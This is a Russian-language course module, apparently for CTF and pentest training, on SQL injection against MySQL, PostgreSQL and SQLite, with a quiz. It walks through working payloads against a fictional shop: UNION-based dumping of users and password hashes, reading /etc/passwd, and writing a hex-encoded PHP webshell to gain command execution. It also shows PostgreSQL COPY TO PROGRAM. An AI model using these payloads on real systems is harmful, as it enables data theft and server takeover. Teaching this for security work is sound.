---
id: web-sqli-dbms-open
title: "Открытые СУБД: MySQL, PostgreSQL и SQLite"
category: web
parent: web-sqli-dbms
difficulty: medium
order: 1
tags: [sqli, mysql, postgresql, sqlite, union, outfile, rce, dbms]
prerequisites: [web-sqli, web-sqli-dbms]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "Модуль-навигатор по трём самым частым открытым СУБД в вебе: MySQL/MariaDB, PostgreSQL и SQLite — что общего и чем диалекты различаются при инъекции."
---

## Вопрос, с которого всё начинается

Ты нашёл SQL-инъекцию: параметр `id` в адресе ломает запрос. Дальше — привычный план: вытащить таблицы, дампнуть пароли, поискать запись файла. Но вот беда: `SLEEP(5)` ничего не тормозит, `information_schema` возвращает пустоту, а `#` в конце запроса вызывает ошибку. Значит, это не MySQL. А что тогда?

От ответа зависит всё: у каждой базы свой синтаксис, свои функции и свои способы дойти до RCE. Перепутаешь диалект — потратишь час на payload, который в принципе не может сработать.

## Наш пример

Возьмём вымышленный, но типичный магазин: `https://shop.t/?id=1`. В ответе — название товара. Проверим реакцию на кавычку:

```
$ curl -s "https://shop.t/?id=1'"
You have an error in your SQL syntax; check the manual that corresponds
to your MySQL server version for the right syntax to use near ''1'' at line 1
```

Текст ошибки прямо говорит: **MySQL**. Это первая ниточка. Дальше мы пройдём весь путь до RCE на этом примере, а по ходу будем смотреть, чем бы отличался тот же путь для PostgreSQL и SQLite.

> **Диалект** — это «версия языка SQL», которую понимает конкретная база. Один и тот же запрос `SELECT` понимают все, а вот `SLEEP`, `GROUP_CONCAT` и метаданные у всех разные.

## Шаг 1: как отличить три базы

Диалект определяется по трём признакам: текст ошибки, синтаксис функций и метаданные. Сведём в таблицу.

| Признак | MySQL | PostgreSQL | SQLite |
|---------|-------|-----------|--------|
| Комментарий | `#`, `-- `, `/**/` | `--`, `/**/` | `--`, `/**/` |
| Версия | `@@version` | `version()` | `sqlite_version()` |
| Строки в одну | `GROUP_CONCAT` | `string_agg` | `group_concat` |
| Пауза | `SLEEP(n)` | `pg_sleep(n)` | нет |
| Метаданные | `information_schema` | `information_schema` | `sqlite_master` |
| Чтение файла | `LOAD_FILE()` | `pg_read_file()` | нет |

Проверим версию и права прямо через инъекцию. Сначала выясним, сколько колонок в исходном запросе — иначе `UNION` не сойдётся:

```
$ curl -s "https://shop.t/?id=1 ORDER BY 3-- -"   # страница отрисовалась
$ curl -s "https://shop.t/?id=1 ORDER BY 4-- -"   # ошибка "Unknown column"
```

Три колонки. Ищем, какая из них отражается на странице:

```
$ curl -s "https://shop.t/?id=-1 UNION SELECT 1,2,3-- -"
... 2 ...
```

Отражается вторая. Теперь читаем версию и пользователя:

```
$ curl -s "https://shop.t/?id=-1 UNION SELECT 1,@@version,3-- -"
... 8.0.32 ...
$ curl -s "https://shop.t/?id=-1 UNION SELECT 1,user(),3-- -"
... app@localhost ...
```

`@@version` сработал — это подтверждает MySQL. В PostgreSQL пришлось бы писать `version()`, в SQLite — `sqlite_version()`.

## Шаг 2: метаданные и дамп

Метаданные — это «данные о данных»: список баз, таблиц и колонок. В MySQL они лежат в служебной базе `information_schema`.

```
$ curl -s "https://shop.t/?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"
... users,orders,secrets ...
```

`GROUP_CONCAT` склеивает все строки результата в одну — иначе бы в ответ влезла только первая таблица. Смотрим колонки таблицы `users`:

```
$ curl -s "https://shop.t/?id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -"
... id,username,password,role ...
```

И достаём данные:

```
$ curl -s "https://shop.t/?id=-1 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -"
... admin:5f4dcc3b5aa765d61d8327deb882cf99,alice:... ...
```

`0x3a` — это `:` в hex-записи: так разделяем логин и пароль в одной строке.

> В PostgreSQL те же метаданные тоже в `information_schema`, но склейка строк — `string_agg(name, ',')`, а не `GROUP_CONCAT`.

## Шаг 3: от чтения файлов к RCE

Дальше — самое интересное. MySQL умеет читать и писать файлы на сервере.

```
$ curl -s "https://shop.t/?id=-1 UNION SELECT 1,@@secure_file_priv,3-- -"
... (пусто) ...
```

Пустое значение `secure_file_priv` означает: запись разрешена в любой каталог. Значит, можно положить webshell. Сначала читаем файл для разведки:

```
$ curl -s "https://shop.t/?id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -"
... root:x:0:0:root:/root:/bin/bash ...
```

Затем пишем PHP-шелл (содержимое передаём в hex, чтобы не ломать запрос кавычками):

```
$ curl -s "https://shop.t/?id=-1 UNION SELECT 1,0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e,3 INTO OUTFILE '/var/www/html/s.php'-- -"
```

И проверяем RCE:

```
$ curl -s "https://shop.t/s.php?c=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Артефакт — вывод `id` с веб-сервера. Это уже не «инъекция», а полный контроль над процессом.

> `INTO OUTFILE` требует привилегии `FILE` и каталога, куда пишет пользователь веб-сервера. Если `secure_file_priv` не пуст — пиши только туда. Если и это закрыто — путь к RCE лежит через лог-пуазинг или UDF.

## Шаг 4: чем бы отличались PostgreSQL и SQLite

Если бы ошибка сказала `pg_sleep`, а не MySQL, скрипт дампа почти не изменился бы (тот же `information_schema`), а вот RCE был бы другой: PostgreSQL при правах суперпользователя выполняет команды через `COPY ... TO PROGRAM`.

```sql
COPY (SELECT '') TO PROGRAM 'id > /tmp/o';
```

Для SQLite всё иначе. Это файловая база без сервера, и `information_schema` в ней нет — таблицы лежат в `sqlite_master`. Проверим локально на настоящей базе:

```
$ sqlite3 demo.db "SELECT name FROM sqlite_master WHERE type='table';"
users
secrets
$ sqlite3 demo.db "SELECT sql FROM sqlite_master WHERE name='users';"
CREATE TABLE users(id INTEGER PRIMARY KEY, name TEXT, role TEXT)
```

Функции задержки в SQLite нет вообще, зато есть `group_concat` и `UNION`:

```
$ sqlite3 demo.db "SELECT id,name FROM users UNION SELECT id,flag FROM secrets;"
1|admin
1|flag{sql1t3_1nj3ct10n}
2|alice
3|bob
```

Обрати внимание: третья таблица `secrets` не была в обычном выводе, но `UNION` подмешал её строки. Так же и в инъекции: диалект другой — идея та же.

## Что мы теперь знаем

- Диалект определяется по ошибке, функциям и метаданным — не угадывай, проверяй.
- `ORDER BY n` находит число колонок, `UNION SELECT 1,2,3` — точку отражения.
- `information_schema` есть в MySQL и PostgreSQL, в SQLite вместо неё `sqlite_master`.
- Склейка строк: `GROUP_CONCAT` (MySQL/SQLite) против `string_agg` (PostgreSQL).
- RCE: MySQL — `INTO OUTFILE`/UDF, PostgreSQL — `COPY TO PROGRAM`, SQLite — только `ATTACH`-файл.

## На что смотреть дальше

- **`secure_file_priv`** — если не пусто, запись только в указанный каталог.
- **Привилегии.** `LOAD_FILE` требует `FILE`, `COPY TO PROGRAM` — суперпользователя.
- **PDO с эмуляцией** может запрещать stacked-запросы (`;`).
- **Кодировка соединения** (`SET NAMES`) влияет на парсинг кавычек — отсюда мультибайт-обходы.
- **Ложное срабатывание.** Пустой ответ на кавычку ещё не инъекция: сравни размер ответа с базовым.

## Квиз

Проверь себя.

```quiz
- question: "Какая функция склеивает строки результата в одну в PostgreSQL?"
  options:
    - "GROUP_CONCAT"
    - "string_agg"
    - "LISTAGG"
    - "CONCAT_WS"
  answer: 1
  explanation: "string_agg(x, ',') — PostgreSQL; GROUP_CONCAT — MySQL/SQLite, LISTAGG — Oracle."
- question: "Где в SQLite хранится список таблиц?"
  options:
    - "information_schema.tables"
    - "pg_catalog"
    - "sqlite_master"
    - "all_tables"
  answer: 2
  explanation: "В SQLite метаданные лежат в sqlite_master."
- question: "Почему в SQLite не работает time-based blind через SLEEP?"
  options:
    - "Функции SLEEP в SQLite не существует"
    - "SLEEP работает только у суперпользователя"
    - "SQLite не поддерживает SELECT"
    - "SLEEP блокирует WAF"
  answer: 0
  explanation: "В SQLite нет функции задержки — используют UNION или булеву логику."
- question: "Что означает пустое значение @@secure_file_priv в MySQL?"
  options:
    - "Запись файлов полностью запрещена"
    - "Запись разрешена в любой каталог"
    - "Файл можно только читать"
    - "База работает в read-only"
  answer: 1
  explanation: "Пусто = ограничений на каталог записи нет; непусто = только в этот каталог."
- question: "Какой командой PostgreSQL при правах суперпользователя выполняет команду ОС?"
  options:
    - "INTO OUTFILE"
    - "COPY ... TO PROGRAM"
    - "ATTACH DATABASE"
    - "LOAD_FILE"
  answer: 1
  explanation: "COPY (SELECT '') TO PROGRAM '...' запускает команду; это PostgreSQL-специфика."
```

## Куда дальше

В следующем уроке мы возьмём те же инъекции, но уже на **корпоративных** СУБД — MSSQL и Oracle, где `xp_cmdshell` и linked servers превращают инъекцию в RCE и шаг к домену. А пока главное запомни: **сначала определи диалект, потом пиши payload** — иначе бьёшься в стену.

## Где пригодится

- **CTF (Web):** большинство задач на SQLi — MySQL/PostgreSQL/SQLite; умение выбрать диалект экономит время.
- **Bug bounty:** реальные приложения чаще всего крутят MySQL или PostgreSQL — рабочий payload под правильную базу = подтверждённый high/critical.
- **Пентест:** отчёт требует точной идентификации СУБД и PoC под неё.
- **Работа (AppSec):** ревью запросов и конфигураций под конкретный движок.
